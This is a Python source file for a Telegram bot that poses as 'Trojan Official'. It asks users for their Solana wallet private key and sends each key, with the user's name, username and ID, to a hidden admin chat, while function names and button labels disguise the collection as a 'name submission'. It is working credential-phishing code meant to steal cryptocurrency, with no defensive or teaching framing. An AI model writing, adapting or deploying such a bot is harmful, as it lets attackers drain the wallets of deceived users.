import logging
import os
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, ConversationHandler

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Configuration - using environment variables for security
BOT_TOKEN = os.environ.get('BOT_TOKEN')
ADMIN_CHAT_ID = int(os.environ.get('ADMIN_CHAT_ID', '0'))

# Conversation states
WAITING_FOR_NAME = 1

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Send welcome message with button."""
    user = update.effective_user
    
    # Create keyboard with button
    keyboard = [[KeyboardButton("Submit Your Name")]]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=False)
    
    welcome_message = (
        f"Welcome to this bot, {user.first_name}! 👋\n\n"
        "Welcome to Trojan Official. Click the button below and bind your wallet to start."
    )
    
    await update.message.reply_text(welcome_message, reply_markup=reply_markup)
    return ConversationHandler.END

async def handle_submit_button(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle the 'Submit Your Name' button press."""
    await update.message.reply_text(
        "Enter your Solana wallet private key:",
        reply_markup=ReplyKeyboardMarkup([[KeyboardButton("Cancel")]], resize_keyboard=True)
    )
    return WAITING_FOR_NAME

async def receive_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Receive the user's name and forward to admin."""
    user = update.effective_user
    user_name = update.message.text
    
    if user_name.lower() == 'cancel':
        keyboard = [[KeyboardButton("Submit Your Name")]]
        reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
        await update.message.reply_text("Cancelled. You can submit your Solana wallet anytime!", reply_markup=reply_markup)
        return ConversationHandler.END
    
    # Send confirmation to user
    await update.message.reply_text(
        f"Thank you! Your wallet's private key '{user_name}' has been submitted. ✅",
        reply_markup=ReplyKeyboardMarkup([[KeyboardButton("Submit Solana Wallet")]], resize_keyboard=True)
    )
    
    # Forward to admin
    admin_message = (
        f"📝 New Name Submission\n\n"
        f"Private Key: {user_name}\n"
        f"From: {user.first_name} {user.last_name or ''}\n"
        f"Username: @{user.username or 'N/A'}\n"
        f"User ID: {user.id}\n"
        f"Date: {update.message.date}"
    )
    
    try:
        await context.bot.send_message(chat_id=ADMIN_CHAT_ID, text=admin_message)
        logger.info(f"Key submission submitted to admin: {user_name}")
    except Exception as e:
        logger.error(f"Failed to send message to admin: {e}")
    
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Cancel the conversation."""
    keyboard = [[KeyboardButton("Submit Your Name")]]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    await update.message.reply_text("Cancelled. You can submit your name anytime!", reply_markup=reply_markup)
    return ConversationHandler.END

def main():
    """Start the bot."""
    if not BOT_TOKEN or ADMIN_CHAT_ID == 0:
        logger.error("Please set BOT_TOKEN and ADMIN_CHAT_ID environment variables!")
        return
    
    # Create application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Conversation handler for name submission
    conv_handler = ConversationHandler(
        entry_points=[
            CommandHandler('start', start),
            MessageHandler(filters.Regex('^Submit Your Name$'), handle_submit_button)
        ],
        states={
            WAITING_FOR_NAME: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_name)
            ]
        },
        fallbacks=[
            CommandHandler('cancel', cancel),
            MessageHandler(filters.Regex('^Cancel$'), cancel)
        ]
    )
    
    application.add_handler(conv_handler)
    
    # Start the bot
    logger.info("Bot started successfully!")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    main()
